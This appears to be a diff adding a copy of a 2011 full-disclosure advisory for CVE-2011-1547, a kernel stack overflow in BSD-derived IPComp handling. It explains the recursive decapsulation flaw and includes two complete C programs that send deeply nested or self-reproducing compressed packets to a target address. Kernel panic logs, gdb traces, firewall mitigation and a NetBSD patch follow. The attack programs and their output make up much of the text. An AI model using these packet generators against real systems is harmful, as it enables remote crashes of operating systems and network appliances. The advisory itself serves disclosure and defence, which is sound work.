@@ -1,0 +1,852 @@
+//source: http://lists.grok.org.uk/pipermail/full-disclosure/2011-April/080031.html
+
+BSD derived RFC3173 IPComp encapsulation will expand arbitrarily nested payload
+-------------------------------------------------------------------------------
+
+Gruezi, this document describes CVE-2011-1547.
+
+RFC3173 ip payload compression, henceforth ipcomp, is a protocol intended to
+provide compression of ip datagrams, and is commonly used alongside IPSec
+(although there is no requirement to do so).
+
+An ipcomp datagram consists of an ip header with ip->ip_p set to 108, followed
+by a 32 bit ipcomp header, described in C syntax below.
+
+struct ipcomp {
+    uint8_t     comp_nxt;       // Next Header
+    uint8_t     comp_flags;     // Reserved
+    uint16_t    comp_cpi;       // Compression Parameter Index
+};
+
+The Compression Parameter Index indicates which compression algorithm was used
+to compress the ipcomp payload, which is expanded and then routed as requested.
+Although the CPI field is 16 bits wide, in reality only 1 algorithm is widely
+implemented, RFC1951 DEFLATE (cpi=2).
+
+It's well documented that ipcomp can be used to traverse perimeter filtering,
+however this document discusses potential implementation flaws observed in
+popular stacks.
+
+The IPComp implementation originating from NetBSD/KAME implements injection of
+unpacked payloads like so:
+
+    algo = ipcomp_algorithm_lookup(cpi);
+
+    /* ... */
+
+    error = (*algo->decompress)(m, m->m_next, &newlen);
+
+    /* ... */
+
+    if (nxt != IPPROTO_DONE) {
+        if ((inetsw[ip_protox[nxt]].pr_flags & PR_LASTHDR) != 0 &&
+            ipsec4_in_reject(m, NULL)) {
+            IPSEC_STATINC(IPSEC_STAT_IN_POLVIO);
+            goto fail;
+        }
+        (*inetsw[ip_protox[nxt]].pr_input)(m, off, nxt);
+    } else
+        m_freem(m);
+
+    /* ... */
+
+Where inetsw[] contains definitions for supported protocols, and nxt is a
+protocol number, usually associated with ip->ip_p (see
+http://www.iana.org/assignments/protocol-numbers/protocol-numbers.xml), but in
+this case from ipcomp->comp_nxt. m is the mbuf structure adjusted to point to
+the unpacked payload.
+
+The unpacked packet is dispatched to the appropriate protocol handler
+directly from the ipcomp protocol handler. This recursive implementation fails
+to check for stack overflow, and is therefore vulnerable to a remote
+pre-authentication kernel memory corruption vulnerability.
+
+The NetBSD/KAME network stack is used as basis for various other
+operating systems, such as Xnu, FTOS, various embedded devices and
+network appliances, and earlier versions of FreeBSD/OpenBSD (the code
+has since been refactored, but see the NOTES section regarding IPComp
+quines, which still permit remote, pre-authentication, single-packet,
+spoofed-source DoS in the latest versions).
+
+The Xnu port of this code is close to the original, where the decompressed
+payload is recursively injected back into the toplevel ip dispatcher. The
+implementation is otherwise similar, and some alterations to the testcase
+provided for NetBSD should make it work. This is left as an exercise for the
+interested reader.
+
+--------------------
+Affected Software
+------------------------
+
+Any NetBSD derived IPComp/IPSec stack may be vulnerable (Xnu, FTOS, etc.).
+
+NetBSD is not distributed with IPSec support enabled by default, however Apple
+OSX and various other derivatives are. There are so many NetBSD derived network
+stacks that it is infeasible to check them all, concerned administrators are
+advised to check with their vendor if there is any doubt.
+
+Major vendors known to use network stacks derived from NetBSD were pre-notified
+about this vulnerability. If I missed you, it is either not well known that you
+use the BSD stack, you did not respond to security@ mail, or could not use pgp
+properly.
+
+Additionally, administrators of critical or major deployments of NetBSD (e.g.
+dns root servers) were given advance notice in order to deploy appropriate
+filter rules.
+
+Exploitability of kernel stack overflows will vary by platform (n.b. a stack
+overflow is not a stack buffer overflow, for a concise definition see
+TAOCP3,V1,S2.2.2). Also note that a kernel stack overflow is very different
+from a userland stack overflow.
+
+For further discussion, including attacks on other operating systems,
+see the notes section on ipcomp quines below.
+
+--------------------
+Consequences
+-----------------------
+
+While exploitation of kernel stack overflows is a somewhat under researched
+topic, the author feels a skilled attacker would be able to leverage this for
+remote code execution. However, this is not a trivial task, and is highly
+platform dependent.
+
+I have verified kernel stack overflows on NetBSD are exploitable, I have looked
+at the source code for xnu and do not see any obvious obstacles to prevent
+exploitation (kernel stack segment limits, guard pages, etc. which would cause
+the worst impact to be limited to remote denial of service), so have no reason
+to believe it is different.
+
+Thoughts on this topic from fellow researchers would be welcome.
+
+Source code for a sample Linux program to reproduce this flaw on NetBSD is
+listed below. Please note, check if your system requires an IPv4 header in the
+compressed payload before attempting to adapt it to your needs.
+
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <zlib.h>
+#include <alloca.h>
+#include <stdbool.h>
+#include <stdlib.h>
+#include <string.h>
+
+//
+// BSD IPComp Kernel Stack Overflow Testcase
+//  -- Tavis Ormandy <taviso at cmpxchg8b.com>, March 2011
+//
+
+#define MAX_PACKET_SIZE (1024 * 1024 * 32)
+#define MAX_ENCAP_DEPTH 1024
+
+enum {
+    IPCOMP_OUI          = 1,
+    IPCOMP_DEFLATE      = 2,
+    IPCOMP_LZS          = 3,
+    IPCOMP_MAX,
+};
+
+struct ipcomp {
+    uint8_t     comp_nxt;       // Next Header
+    uint8_t     comp_flags;     // Reserved, must be zero
+    uint16_t    comp_cpi;       // Compression parameter index
+    uint8_t     comp_data[0];   // Payload.
+};
+
+bool ipcomp_encapsulate_data(void           *data,
+                             size_t          size,
+                             int             nxt,
+                             struct ipcomp **out,
+                             size_t         *length,
+                             int             level)
+{
+    struct ipcomp *ipcomp;
+    z_stream       zstream;
+
+    ipcomp              = malloc(MAX_PACKET_SIZE);
+    *out                = ipcomp;
+    ipcomp->comp_nxt    = nxt;
+    ipcomp->comp_cpi    = htons(IPCOMP_DEFLATE);
+    ipcomp->comp_flags  = 0;
+
+    // Compress packet payload.
+    zstream.zalloc      = Z_NULL;
+    zstream.zfree       = Z_NULL;
+    zstream.opaque      = Z_NULL;
+
+    if (deflateInit2(&zstream,
+                     level,
+                     Z_DEFLATED,
+                     -12,
+                     MAX_MEM_LEVEL,
+                     Z_DEFAULT_STRATEGY) != Z_OK) {
+        fprintf(stderr, "error: failed to initialize zlib library\n");
+        return false;
+    }
+
+    zstream.avail_in    = size;
+    zstream.next_in     = data;
+    zstream.avail_out   = MAX_PACKET_SIZE - sizeof(struct ipcomp);
+    zstream.next_out    = ipcomp->comp_data;
+
+    if (deflate(&zstream, Z_FINISH) != Z_STREAM_END) {
+        fprintf(stderr, "error: deflate() failed to create compressed payload, %s\n", zstream.msg);
+        return false;
+    }
+
+    if (deflateEnd(&zstream) != Z_OK) {
+        fprintf(stderr, "error: deflateEnd() returned failure, %s\n", zstream.msg);
+        return false;
+    }
+
+    // Calculate size.
+    *length    = (MAX_PACKET_SIZE - sizeof(struct ipcomp)) - zstream.avail_out;
+    ipcomp     = realloc(ipcomp, *length);
+
+    free(data);
+
+    return true;
+}
+
+int main(int argc, char **argv)
+{
+    int                 s;
+    struct sockaddr_in  sin    = {0};
+    struct ipcomp      *ipcomp = malloc(0);
+    size_t              length = 0;
+    unsigned            depth  = 0;
+
+    // Nest an ipcomp packet deeply without compression, this allows us to
+    // create maximum redundancy.
+    for (depth = 0; depth < MAX_ENCAP_DEPTH; depth++) {
+        if (ipcomp_encapsulate_data(ipcomp,
+                                    length,
+                                    IPPROTO_COMP,
+                                    &ipcomp,
+                                    &length,
+                                    Z_NO_COMPRESSION) != true) {
+            fprintf(stderr, "error: failed to encapsulate data\n");
+            return 1;
+        }
+    }
+
+    // Create a final outer packet with best compression, which should now
+    // compress well due to Z_NO_COMPRESSION used in inner payloads.
+    if (ipcomp_encapsulate_data(ipcomp,
+                                length,
+                                IPPROTO_COMP,
+                                &ipcomp,
+                                &length,
+                                Z_BEST_COMPRESSION) != true) {
+        fprintf(stderr, "error: failed to encapsulate data\n");
+        return 1;
+    }
+
+    fprintf(stdout, "info: created %u nested ipcomp payload, %u bytes\n", depth, length);
+
+    sin.sin_family      = AF_INET;
+    sin.sin_port        = htons(0);
+    sin.sin_addr.s_addr = inet_addr(argv[1]);
+
+    if ((s = socket(PF_INET, SOCK_RAW, IPPROTO_COMP)) < 0) {
+        fprintf(stderr, "error: failed to create socket, %m\n");
+        return 1;
+    }
+
+    if (sendto(s,
+               ipcomp,
+               length,
+               MSG_NOSIGNAL,
+               (const struct sockaddr *)(&sin),
+               sizeof(sin)) != length) {
+        fprintf(stderr, "error: send() returned failure, %m\n");
+        return 1;
+    }
+
+    fprintf(stdout, "info: success, packet sent to %s\n", argv[1]);
+
+    free(ipcomp);
+
+    return 0;
+}
+
+
+Packets of the following form are generated.
+
+Internet Protocol, Src: 192.168.1.1, Dst: 192.168.1.2
+    Version: 4
+    Header length: 20 bytes
+    Differentiated Services Field: 0x04 (DSCP 0x01: Unknown DSCP; ECN: 0x00)
+        0000 01.. = Differentiated Services Codepoint: Unknown (0x01)
+        .... ..0. = ECN-Capable Transport (ECT): 0
+        .... ...0 = ECN-CE: 0
+    Total Length: 205
+    Identification: 0xc733 (50995)
+    Flags: 0x00
+        0.. = Reserved bit: Not Set
+        .0. = Don't fragment: Not Set
+        ..0 = More fragments: Not Set
+    Fragment offset: 0
+    Time to live: 64
+    Protocol: IPComp (0x6c)
+    Header checksum: 0x2e69 [correct]
+        [Good: True]
+        [Bad : False]
+    Source: 192.168.1.1
+    Destination: 192.168.1.2
+IP Payload Compression
+    Next Header: IPComp (0x6c)
+    IPComp Flags: 0x00
+    IPComp CPI: DEFLATE (0x0002)
+    Data (181 bytes)
+        Data: 73656158...
+        [Length: 181]
+
+$ gcc ipcomp.c -lz -o ipcomp
+$ sudo ./ipcomp 192.168.1.2
+info: created 1024 nested ipcomp payload, 2538 bytes
+info: success, packet sent to 192.168.1.2
+
+Mar 25 05:34:40  /netbsd: uvm_fault(0xca7bc774, 0x1000, 1) -> 0xe
+Mar 25 05:34:40  /netbsd: fatal page fault in supervisor mode
+Mar 25 05:34:40  /netbsd: trap type 6 code 0 eip c0633269 cs 8 eflags 10202 cr2 1335 ilevel 0
+Mar 25 05:34:40  /netbsd: panic: trap
+Mar 25 05:34:40  /netbsd: Begin traceback...
+Mar 25 05:34:40  /netbsd: uvm_fault(0xca7bc774, 0, 1) -> 0xe
+Mar 25 05:34:40  /netbsd: fatal page fault in supervisor mode
+Mar 25 05:34:40  /netbsd: trap type 6 code 0 eip c06e6c90 cs 8 eflags 10246 cr2 8 ilevel 0
+Mar 25 05:34:40  /netbsd: panic: trap
+Mar 25 05:34:40  /netbsd: Faulted in mid-traceback; aborting...
+
+Adjust depth as required.
+
+(gdb) bt
+#0  ipcomp4_input (m=0xc14e1300) at ../../../../netinet6/ipcomp_input.c:112
+#1  0xc01ec302 in ipcomp4_input (m=0xc14e1300) at ../../../../netinet6/ipcomp_input.c:248
+#2  0xc01ec302 in ipcomp4_input (m=0xc14e1300) at ../../../../netinet6/ipcomp_input.c:248
+#3  0xc01ec302 in ipcomp4_input (m=0xc14e1300) at ../../../../netinet6/ipcomp_input.c:248
+#4  0xc01ec302 in ipcomp4_input (m=0xc14e1300) at ../../../../netinet6/ipcomp_input.c:248
+#5  0xc01ec302 in ipcomp4_input (m=0xc14e1300) at ../../../../netinet6/ipcomp_input.c:248
+#6  0xc01ec302 in ipcomp4_input (m=0xc14e1300) at ../../../../netinet6/ipcomp_input.c:248
+[ trimmed ]
+#148 0xc01ec302 in ipcomp4_input (m=0xc14e1300) at ../../../../netinet6/ipcomp_input.c:248
+#149 0xc01ec302 in ipcomp4_input (m=0xc14e1300) at ../../../../netinet6/ipcomp_input.c:248
+#150 0xc0162bbb in ip_input (m=0xc14e1300) at ../../../../netinet/ip_input.c:1059
+#151 0xc0161b82 in ipintr () at ../../../../netinet/ip_input.c:476
+#152 0xc05d6248 in softint_execute (si=0xca79e154, l=0xca7a7a00, s=4) at ../../../../kern/kern_softint.c:539
+#153 0xc05d60e6 in softint_dispatch (pinned=0xca7a7500, s=4) at ../../../../kern/kern_softint.c:811
+(gdb) info frame
+Stack level 0, frame at 0xcab9bf08:
+ eip = 0xc01ebd5c in ipcomp4_input (../../../../netinet6/ipcomp_input.c:112); saved eip 0xc01ec302
+ called by frame at 0xcab9bfa8
+ source language c.
+ Arglist at 0xcab9bf00, args: m=0xc14e1300
+ Locals at 0xcab9bf00, Previous frame's sp is 0xcab9bf08
+ Saved registers:
+  ebx at 0xcab9bef8, ebp at 0xcab9bf00, esi at 0xcab9befc, eip at 0xcab9bf04
+(gdb) info target
+Symbols from "netbsd.gdb".
+Remote serial target in gdb-specific protocol:
+Debugging a target over a serial line.
+
+Therefore, an oob sp will write attacker controlled data.
+
+(gdb) tb panic
+Temporary breakpoint 2, panic (fmt=0xc0acf54b "trap") at ../../../../kern/subr_prf.c:184
+184     kpreempt_disable();
+(gdb) bt
+#0  panic (fmt=0xc0acf54b "trap") at ../../../../kern/subr_prf.c:184
+#1  0xc06f0919 in trap (frame=0xcac49f84) at ../../../../arch/i386/i386/trap.c:368
+#2  0xc06f0566 in trap_tss (tss=0xc0cfe5ec, trapno=13, code=0) at ../../../../arch/i386/i386/trap.c:197
+#3  0xc010cb1b in ?? ()
+(gdb) frame 1
+(gdb) info symbol frame->tf_eip
+
+etc.
+
+-------------------
+Mitigation
+-----------------------
+
+*******************************************************************************
+* Please note, this document is intended for security professionals, network  *
+* or systems administrators, and vendors of network equipment and software.   *
+* End users need not be concerned.                                            *
+*******************************************************************************
+
+For numerous reasons, it is a good idea to filter IPComp at the perimeter if it is
+not expected. Even when implemented correctly, IPComp completely defeats the
+purpose of Delayed Compression in OpenSSH (see CAN-2005-2096 for an example of
+why you always want delayed compression). Additionally, the encapsulation means
+any attacks that require link-local access can simply be wrapped in ipcomp and
+are then routable (that is not good).
+
+Affected servers and devices can use packet filtering to prevent the vulnerable
+code from being exercised. On systems with ipfw, a rule based on the following
+ipfw/ipfw6 template can be used, adjust to whitelist expected peers as
+appropriate.
+
+# ipfw add deny proto ipcomp
+
+On other BSD systems, pfctl rules can be substituted. See vendor documentation for
+how to configure network appliances to deny IPComp at network boundaries.
+
+-------------------
+Solution
+-----------------------
+
+I would recommend vendors disallow nested encapulation of ipcomp payloads. The
+implementation of this fix will of course vary by product.
+
+By the time you read this advisory, a fix should have been committed to the
+NetBSD repository, downstream consumers of NetBSD code are advised to import
+the changes urgently.
+
+A draft patch from S.P.Zeidler of the NetBSD project is attached for reference.
+
+-------------------
+Credit
+-----------------------
+
+This bug was discovered by Tavis Ormandy.
+
+-------------------
+Greetz
+-----------------------
+
+Greetz to Hawkes, Julien, LiquidK, Lcamtuf, Neel, Spoonm, Felix, Robert,
+Asirap, Meder, Spender, Pipacs, Gynvael, Scarybeasts, Redpig, Kees, Eugene,
+Bruce D., djm, Brian C., djrbliss, jono, and all my other elite friends and
+colleagues.
+
+And of course, $1$kk1q85Xp$Id.gAcJOg7uelf36VQwJQ/.
+
+Additional thanks to Jan, Felix and Meder for their mad xnu skillz.
+
+Jan helps organize a security conference called #days held in Lucerne,
+Switzerland (a very picturesque Swiss city). The CFP is currently open, you
+should check it out at https://www.hashdays.ch/.
+
+-------------------
+Notes
+-----------------------
+
+An elegant method of reproducing this flaw would be using self-reproducing
+Lempel-Ziv programs, rsc describes the technique here:
+
+http://research.swtch.com/2010/03/zip-files-all-way-down.html
+
+This method would also be able to disrupt non-recursive implementations that
+do not prevent nested encapulation, such as modern FreeBSD and OpenBSD.
+Perhaps this will also affect other non-BSD implementations. An ipcomp
+quine is defined below in GNU C syntax below, and a testcase for Linux
+is attached to this mail.
+
+
+    struct {
+        uint8_t     comp_nxt;       // Next Header
+        uint8_t     comp_flags;     // Reserved, must be zero
+        uint16_t    comp_cpi;       // Compression parameter index
+        uint8_t     comp_data[180]; // Payload
+    } ipcomp = {
+            .comp_nxt       = IPPROTO_COMP,
+            .comp_flags     = 0,
+            .comp_cpi       = htons(IPCOMP_DEFLATE),
+            .comp_data      = {
+                0xca, 0x61, 0x60, 0x60, 0x02, 0x00, 0x0a, 0x00, 0xf5, 0xff,
+                0xca, 0x61, 0x60, 0x60, 0x02, 0x00, 0x0a, 0x00, 0xf5, 0xff,
+                0x02, 0xb3, 0xc0, 0x2c, 0x00, 0x00, 0x05, 0x00, 0xfa, 0xff,
+                0x02, 0xb3, 0xc0, 0x2c, 0x00, 0x00, 0x05, 0x00, 0xfa, 0xff,
+                0x00, 0x05, 0x00, 0xfa, 0xff, 0x00, 0x14, 0x00, 0xeb, 0xff,
+                0x02, 0xb3, 0xc0, 0x2c, 0x00, 0x00, 0x05, 0x00, 0xfa, 0xff,
+                0x00, 0x05, 0x00, 0xfa, 0xff, 0x00, 0x14, 0x00, 0xeb, 0xff,
+                0x42, 0x88, 0x21, 0xc4, 0x00, 0x00, 0x14, 0x00, 0xeb, 0xff,
+                0x42, 0x88, 0x21, 0xc4, 0x00, 0x00, 0x14, 0x00, 0xeb, 0xff,
+                0x42, 0x88, 0x21, 0xc4, 0x00, 0x00, 0x14, 0x00, 0xeb, 0xff,
+                0x42, 0x88, 0x21, 0xc4, 0x00, 0x00, 0x14, 0x00, 0xeb, 0xff,
+                0x42, 0x88, 0x21, 0xc4, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff,
+                0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x0f, 0x00, 0xf0, 0xff,
+                0x42, 0x88, 0x21, 0xc4, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff,
+                0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x0f, 0x00, 0xf0, 0xff,
+                0x82, 0x72, 0x61, 0x5c, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff,
+                0x01, 0x00, 0x00, 0xff, 0xff, 0x82, 0x72, 0x61, 0x5c, 0x00,
+                0x00, 0x00, 0x00, 0xff, 0xff, 0x01, 0x00, 0x00, 0xff, 0xff
+            }
+    };
+
+
+Note that modern FreeBSD and OpenBSD appear to drop incoming ipcomp packets if
+no TBD entries are known (see netstat -s -p ipcomp statistics, and
+the setkey documentation). You will have to allow for this while
+testing. Depending on implementation, You may also need to spoof the
+source address of a peer, see man 7 raw.
+
+Special thanks to rsc and Matthew Dempsky for hints and assistance.
+
+Something like this may be useful for testing:
+
+# setkey -c
+add 192.168.0.1 192.168.0.2 ipcomp 0002 -C deflate
+^D
+
+-
+
+I would advise caution when sending malformed or pathological packets
+across critical infrastructure or the public internet, many embedded devices
+are based on BSD-derived code and may not handle the error gracefully.
+
+-
+
+Julien will be angry I didn't use scapy, sorry! I am a fan :-)
+
+-
+
+A bug in Xnu's custom allocator for zlib (deflate_alloc) causes zlib
+initialisation to fail if ~1k bytes is not available to MALLOC() with M_NOWAIT,
+even though M_WAITOK was intended, as described in the comments:
+
+        /*
+         * Avert your gaze, ugly hack follows!
+         * We init here so our malloc can allocate using M_WAIT.
+         * We don't want to allocate if ipcomp isn't used, and we
+         * don't want to allocate on the input or output path.
+         * Allocation fails if we use M_NOWAIT because init allocates
+         * something like 256k (ouch).
+         */
+
+However with some creativity it is possible to make the allocation succeed. You
+can observe this bug by sending an ipcomp packet and looking for the memory
+allocation failure in the network statistics (try something like `netstat -s |
+grep -A16 ipsec:`). You can also set `sysctl -w net.inet.ipsec.debug=1`.
+
+-------------------
+References
+-----------------------
+
+- http://research.swtch.com/2010/03/zip-files-all-way-down.html
+  research!rsc: Zip Files All The Way Down
+- http://tools.ietf.org/html/rfc3173
+  RFC3173: IP Payload Compression Protocol (IPComp)
+- http://cvsweb.netbsd.org/bsdweb.cgi/src/sys/netinet6/ipcomp_input.c?rev=1.36&content-type=text/x-cvsweb-markup&only_with_tag=MAIN
+  NetBSD: ipcomp_input.c, v1.36
+- http://www.opensource.apple.com/source/xnu/xnu-1456.1.26/bsd/netinet6/ipcomp_input.c
+  Xnu: ipcomp_input.c
+- http://developer.apple.com/library/mac/#documentation/Darwin/Reference/ManPages/man8/ipfw.8.html
+  ipfw -- IP firewall and traffic shaper control program
+- http://www.netbsd.org/docs/network/pf.html
+  The NetBSD Packet Filter (generally applies to other popular BSDs).
+- http://fxr.watson.org/fxr/source/netinet6/ipcomp_input.c?v=FREEBSD64#L222
+  Earlier versions of FreeBSD were implemented recursively, the code was since refactored.
+- http://fxr.watson.org/fxr/source/netipsec/xform_ipcomp.c?v=FREEBSD81#L299
+  The current version is implemented iteratively (see NOTES section on Quine DoS).
+- http://www.force10networks.com/products/ftos.asp
+  FTOS - Force10 Operating System
+- http://www.qnx.com/developers/docs/6.4.1/io-pkt_en/user_guide/drivers.html
+  QNX Network Drivers Documentation
+
+Support high-quality journalism in information security by subscribing to LWN
+http://lwn.net/ (i have no connection to lwn other than appreciating their
+work).
+
+I have a twitter account where I occasionally comment on security topics.
+
+http://twitter.com/taviso
+
+ex$$
+
+-- 
+-------------------------------------
+taviso at cmpxchg8b.com | pgp encrypted mail preferred
+-------------------------------------------------------
+-------------- next part --------------
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <zlib.h>
+#include <alloca.h>
+#include <stdbool.h>
+#include <stdlib.h>
+#include <string.h>
+
+//
+// BSD IPComp Kernel Stack Overflow Testcase
+//  -- Tavis Ormandy <taviso at cmpxchg8b.com>, March 2011
+//
+
+#define MAX_PACKET_SIZE (1024 * 1024 * 32)
+#define MAX_ENCAP_DEPTH 1024
+
+enum {
+    IPCOMP_OUI          = 1,
+    IPCOMP_DEFLATE      = 2,
+    IPCOMP_LZS          = 3,
+    IPCOMP_MAX,
+};
+
+struct ipcomp {
+    uint8_t     comp_nxt;       // Next Header
+    uint8_t     comp_flags;     // Reserved, must be zero
+    uint16_t    comp_cpi;       // Compression parameter index
+    uint8_t     comp_data[0];   // Payload.
+};
+
+bool ipcomp_encapsulate_data(void           *data,
+                             size_t          size,
+                             int             nxt,
+                             struct ipcomp **out,
+                             size_t         *length,
+                             int             level)
+{
+    struct ipcomp *ipcomp;
+    z_stream       zstream;
+
+    ipcomp              = malloc(MAX_PACKET_SIZE);
+    *out                = ipcomp;
+    ipcomp->comp_nxt    = nxt;
+    ipcomp->comp_cpi    = htons(IPCOMP_DEFLATE);
+    ipcomp->comp_flags  = 0;
+
+    // Compress packet payload.
+    zstream.zalloc      = Z_NULL;
+    zstream.zfree       = Z_NULL;
+    zstream.opaque      = Z_NULL;
+
+    if (deflateInit2(&zstream,
+                     level,
+                     Z_DEFLATED,
+                     -12,
+                     MAX_MEM_LEVEL,
+                     Z_DEFAULT_STRATEGY) != Z_OK) {
+        fprintf(stderr, "error: failed to initialize zlib library\n");
+        return false;
+    }
+
+    zstream.avail_in    = size;
+    zstream.next_in     = data;
+    zstream.avail_out   = MAX_PACKET_SIZE - sizeof(struct ipcomp);
+    zstream.next_out    = ipcomp->comp_data;
+
+    if (deflate(&zstream, Z_FINISH) != Z_STREAM_END) {
+        fprintf(stderr, "error: deflate() failed to create compressed payload, %s\n", zstream.msg);
+        return false;
+    }
+
+    if (deflateEnd(&zstream) != Z_OK) {
+        fprintf(stderr, "error: deflateEnd() returned failure, %s\n", zstream.msg);
+        return false;
+    }
+
+    // Calculate size.
+    *length    = (MAX_PACKET_SIZE - sizeof(struct ipcomp)) - zstream.avail_out;
+    ipcomp     = realloc(ipcomp, *length);
+
+    free(data);
+
+    return true;
+}
+
+int main(int argc, char **argv)
+{
+    int                 s;
+    struct sockaddr_in  sin    = {0};
+    struct ipcomp      *ipcomp = malloc(0);
+    size_t              length = 0;
+    unsigned            depth  = 0;
+
+    // Nest an ipcomp packet deeply without compression, this allows us to
+    // create maximum redundancy.
+    for (depth = 0; depth < MAX_ENCAP_DEPTH; depth++) {
+        if (ipcomp_encapsulate_data(ipcomp,
+                                    length,
+                                    IPPROTO_COMP,
+                                    &ipcomp,
+                                    &length,
+                                    Z_NO_COMPRESSION) != true) {
+            fprintf(stderr, "error: failed to encapsulate data\n");
+            return 1;
+        }
+    }
+
+    // Create a final outer packet with best compression, which should now
+    // compress well due to Z_NO_COMPRESSION used in inner payloads.
+    if (ipcomp_encapsulate_data(ipcomp,
+                                length,
+                                IPPROTO_COMP,
+                                &ipcomp,
+                                &length,
+                                Z_BEST_COMPRESSION) != true) {
+        fprintf(stderr, "error: failed to encapsulate data\n");
+        return 1;
+    }
+
+    fprintf(stdout, "info: created %u nested ipcomp payload, %u bytes\n", depth, length);
+
+    sin.sin_family      = AF_INET;
+    sin.sin_port        = htons(0);
+    sin.sin_addr.s_addr = inet_addr(argv[1]);
+
+    if ((s = socket(PF_INET, SOCK_RAW, IPPROTO_COMP)) < 0) {
+        fprintf(stderr, "error: failed to create socket, %m\n");
+        return 1;
+    }
+
+    if (sendto(s,
+               ipcomp,
+               length,
+               MSG_NOSIGNAL,
+               (const struct sockaddr *)(&sin),
+               sizeof(sin)) != length) {
+        fprintf(stderr, "error: send() returned failure, %m\n");
+        return 1;
+    }
+
+    fprintf(stdout, "info: success, packet sent to %s\n", argv[1]);
+
+    free(ipcomp);
+
+    return 0;
+}
+-------------- next part --------------
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <zlib.h>
+#include <alloca.h>
+#include <stdbool.h>
+#include <stdlib.h>
+#include <string.h>
+
+//
+// Nested IPComp Encapsulation with DEFLATE LZ77 RFC1951 Quine.
+//
+// The technique used to generate this payload is documented here:
+//
+//  http://research.swtch.com/2010/03/zip-files-all-way-down.html
+//
+//  -- Tavis Ormandy <taviso at cmpxchg8b.com>, March 2011
+//
+// Special thanks to rsc and Matthew Dempsky.
+//
+
+enum {
+    IPCOMP_OUI          = 1,
+    IPCOMP_DEFLATE      = 2,
+    IPCOMP_LZS          = 3,
+    IPCOMP_MAX,
+};
+
+int main(int argc, char **argv)
+{
+    int                 s;
+    struct sockaddr_in  sin    = {0};
+
+    struct __attribute__((packed)) {
+        uint8_t     comp_nxt;       // Next Header
+        uint8_t     comp_flags;     // Reserved, must be zero
+        uint16_t    comp_cpi;       // Compression parameter index
+        uint8_t     comp_data[180]; // Payload
+    } ipcomp = {
+            .comp_nxt       = IPPROTO_COMP,
+            .comp_flags     = 0,
+            .comp_cpi       = htons(IPCOMP_DEFLATE),
+            .comp_data      = {
+                0xca, 0x61, 0x60, 0x60, 0x02, 0x00, 0x0a, 0x00, 0xf5, 0xff,
+                0xca, 0x61, 0x60, 0x60, 0x02, 0x00, 0x0a, 0x00, 0xf5, 0xff,
+                0x02, 0xb3, 0xc0, 0x2c, 0x00, 0x00, 0x05, 0x00, 0xfa, 0xff,
+                0x02, 0xb3, 0xc0, 0x2c, 0x00, 0x00, 0x05, 0x00, 0xfa, 0xff,
+                0x00, 0x05, 0x00, 0xfa, 0xff, 0x00, 0x14, 0x00, 0xeb, 0xff,
+                0x02, 0xb3, 0xc0, 0x2c, 0x00, 0x00, 0x05, 0x00, 0xfa, 0xff,
+                0x00, 0x05, 0x00, 0xfa, 0xff, 0x00, 0x14, 0x00, 0xeb, 0xff,
+                0x42, 0x88, 0x21, 0xc4, 0x00, 0x00, 0x14, 0x00, 0xeb, 0xff,
+                0x42, 0x88, 0x21, 0xc4, 0x00, 0x00, 0x14, 0x00, 0xeb, 0xff,
+                0x42, 0x88, 0x21, 0xc4, 0x00, 0x00, 0x14, 0x00, 0xeb, 0xff,
+                0x42, 0x88, 0x21, 0xc4, 0x00, 0x00, 0x14, 0x00, 0xeb, 0xff,
+                0x42, 0x88, 0x21, 0xc4, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff,
+                0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x0f, 0x00, 0xf0, 0xff,
+                0x42, 0x88, 0x21, 0xc4, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff,
+                0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x0f, 0x00, 0xf0, 0xff,
+                0x82, 0x72, 0x61, 0x5c, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff,
+                0x01, 0x00, 0x00, 0xff, 0xff, 0x82, 0x72, 0x61, 0x5c, 0x00,
+                0x00, 0x00, 0x00, 0xff, 0xff, 0x01, 0x00, 0x00, 0xff, 0xff
+            }
+    };
+
+
+    sin.sin_family      = AF_INET;
+    sin.sin_port        = htons(0);
+    sin.sin_addr.s_addr = inet_addr(argv[1]);
+
+    if ((s = socket(PF_INET, SOCK_RAW, IPPROTO_COMP)) < 0) {
+        fprintf(stderr, "error: failed to create socket, %m\n");
+        return 1;
+    }
+
+    if (sendto(s,
+               &ipcomp,
+               sizeof(ipcomp),
+               MSG_NOSIGNAL,
+               (const struct sockaddr *)(&sin),
+               sizeof(sin)) != sizeof(ipcomp)) {
+        fprintf(stderr, "error: send() returned failure, %m\n");
+        return 1;
+    }
+
+    fprintf(stdout, "info: success, packet sent to %s\n", argv[1]);
+
+    return 0;
+}
+-------------- next part --------------
+Index: sys/netipsec/xform_ipcomp.c
+===================================================================
+RCS file: /cvsroot/src/sys/netipsec/xform_ipcomp.c,v
+retrieving revision 1.25
+diff -u -u -p -r1.25 xform_ipcomp.c
+--- sys/netipsec/xform_ipcomp.c	24 Feb 2011 20:03:41 -0000	1.25
++++ sys/netipsec/xform_ipcomp.c	29 Mar 2011 19:24:04 -0000
+@@ -326,6 +326,14 @@ ipcomp_input_cb(struct cryptop *crp)
+ 	/* Keep the next protocol field */
+ 	addr = (uint8_t*) mtod(m, struct ip *) + skip;
+ 	nproto = ((struct ipcomp *) addr)->comp_nxt;
++	if (nproto == IPPROTO_IPCOMP || nproto == IPPROTO_AH || nproto == IPPROTO_ESP) {
++		IPCOMP_STATINC(IPCOMP_STAT_HDROPS);
++		DPRINTF(("ipcomp_input_cb: nested ipcomp, IPCA %s/%08lx\n",
++			 ipsec_address(&sav->sah->saidx.dst),
++			 (u_long) ntohl(sav->spi)));
++		error = EINVAL;
++		goto bad;
++	}
+ 
+ 	/* Remove the IPCOMP header */
+ 	error = m_striphdr(m, skip, hlen);
